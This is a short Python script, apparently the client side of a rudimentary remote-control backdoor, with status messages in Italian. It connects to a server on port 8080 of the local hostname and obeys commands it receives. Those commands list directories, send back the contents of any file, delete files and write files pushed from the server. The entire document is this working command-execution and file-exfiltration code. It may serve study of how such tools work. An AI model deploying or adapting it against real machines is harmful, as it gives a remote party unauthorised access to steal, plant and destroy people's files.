import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(), 8080))
print(f"\nconnessione al server {socket.gethostname()} avvenuto con successo\n")
while 1:
	command = s.recv(1024)
	command = command.decode()
	print("Comando ricevuto\n")

	if command == "view_cwd":
		files = os.getcwd()
		files = str(files)
		s.send(files.encode())
		print("\nil comando è stato eseguito con successo\n")
	
	elif command == "custom_dir":
		user_input = s.recv(5000)
		user_input = user_input.decode()
		files = os.listdir(user_input)
		files = str(files)
		s.send(files.encode())
		print("\nil comando è stato eseguito con successo\n")

	elif command == "download_file":
		file_path = s.recv(5000)
		file_path = file_path.decode()
		file = open(file_path, "rb")
		data = file.read()
		s.send(data)
		print("\nil file è stato inviato con successo\n")

	elif command == "remove_file":
		fileanddir = s.recv(6000)
		fileanddir = fileanddir.decode()
		os.remove(fileanddir)
		print("\nil comando è stato eseguito correttamente\n")

	elif command == "send_files":
		filename = s.recv(6000)
		print(filename)
		new_file = open(filename, "wb")
		data = s.recv(6000)
		print(data)
		new_file.write(data)
		new_file.close()
	else:
		print("\ncomando non riconosciuto")